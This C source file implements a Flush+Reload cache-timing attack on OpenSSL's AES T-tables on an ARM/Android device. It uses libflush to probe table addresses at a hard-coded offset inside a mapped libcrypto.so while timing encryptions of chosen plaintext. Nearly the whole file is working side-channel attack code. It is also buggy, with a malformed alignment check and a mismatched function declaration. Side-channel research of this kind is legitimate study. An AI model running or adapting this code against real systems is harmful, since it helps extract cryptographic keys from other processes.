#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <inttypes.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include<time.h>
#include <libflush/libflush.h>
//#include "cacheutils.h"
//#include <map>
//#include <vector>
//#include <iostream>
// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (110)
#define THRESHOLD (110)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (2)
#define NUMBER_OF_ENCRYPTIONS2 (12000)
#define MAP_SIZE 4096

static inline uint32_t get_cycle_count(void);




unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

size_t sum;
size_t scount;

//std::map<char*, std::map<size_t, size_t> > timings;
//std::map<size_t,size_t > timings_delta;
char* base;
char* probe;
char* end;
unsigned char* tmp;
unsigned char* tmp_end;

int main()
{
   
  //unsigned char array[4096]={0};
 // int *address = &array[4096]; 
  int fd = open("/data/local/tmp/crypto/libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size) & (0xFFF != 0))
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;
  tmp = 0xb6dda000 + 0x14f45c;
  tmp_end = tmp + 0x1000;
  //volatile unsigned int *p = (volatile unsigned int *)tmp;
  printf("The end value of tables are is %p\n",tmp_end);
  int i =0;
  for(i=0;i<4;i++) 
     printf("%02x\n",*(tmp+3-i));
 /*
  printf("Printing from next table\n");   
  for(i=0;i<4;i++) 
    printf("%02x\n",*(tmp_end+3-i));
   */
   getchar();
     
  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];
  
  libflush_session_args_t args = { 0 };
  //args.bind_to_cpu = thread_cpu;
  libflush_session_t* libflush_session;
  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }
 // void* address = (void*) ((char*) array + MAP_SIZE / 2);
//  libflush_access_memory(address);


  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  struct timespec time = {0,0};
  clock_gettime(CLOCK_MONOTONIC, &time);
  double measured_time = ((double)time.tv_sec + 1.0e-9*time.tv_nsec);
  srand(measured_time);
  
for (size_t byte = 0; byte < 256; byte += 16)
  {
/* Chosen plain-text byte*/
//    plaintext[0] = byte;
    //plaintext[0]=byte;
    plaintext[1]=byte;
    //plaintext[2]=byte;
   // plaintext[3]=byte;
   // AES_encrypt(plaintext, ciphertext, &key_struct);
/* Probing the T-table elements*/
for (probe = tmp; probe < tmp + 0x1000; probe += 64) // 16    
    {	
	  printf("The value of probe address is %p",probe);	
      size_t count = 0;
      size_t delta_sum = 0;
     for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {

        for (size_t j = 1; j < 16; ++j)
          {  
			plaintext[0] = rand() % 256;
			plaintext[j] = rand() % 256;
}
    //    AES_encrypt(plaintext,ciphertext,&key_struct);
        size_t time2 = libflush_get_timing(libflush_session);
        AES_encrypt(plaintext,ciphertext,&key_struct);
        size_t delta_aes2 = libflush_get_timing(libflush_session)-time2;   
        size_t timer2 = libflush_reload_address_and_flush(libflush_session, probe);
        AES_encrypt(plaintext, ciphertext, &key_struct); 
        size_t timer3 = libflush_reload_address(libflush_session, probe); 
        size_t delta = 0;
//        if (delta > THRESHOLD)
  //        ++count;
     //   size_t timer1 = libflush_reload_address(libflush_session, address);
       // size_t timer2 = libflush_reload_address_and_flush(libflush_session, address);
       // size_t timer3 = libflush_reload_address(libflush_session, address);
        fprintf(stdout, " Time for 2nd AES\t %zu\n",delta_aes2);
        fprintf(stdout, "\t %zu\t %zu\n",timer2,timer3);
      }

      // fprintf(stdout,"%zu\t%zu\n",byte,delta_);
     // timings_delta[byte]=delta_sum;
    //  timings[probe][byte] = count;
    }
  }
  
/*printf("\n\n\n\n**********\n\n\n\n");
printf("\nPrinting the values of timings w.r.t the probe address and plain-text bytes\n");*/
/*
  for (auto ait : timings)
  {
    printf("%p:\t", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf("%6lu,", kit.second);
    }
    printf("\n");
  }

int index=0;
printf("\nPrinting the plain text\n");
for(index =0;index<16;index++)
{
 printf("%c",plaintext[index]);
}

printf("\nPrinting the Decrypted text\n");
AES_decrypt(ciphertext,restoredtext,&key_struct);
for(index =0;index<16;index++)
{
 printf("%c",restoredtext[index]);
}*/

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  getchar();
  return 0;
}

static inline size_t get_cycle_count(void)
{
        uint32_t r = 0;
         __asm__ __volatile__("mrc p15, 0, %0, c9, c13, 0" : "=r"(r) );
        return r;
}

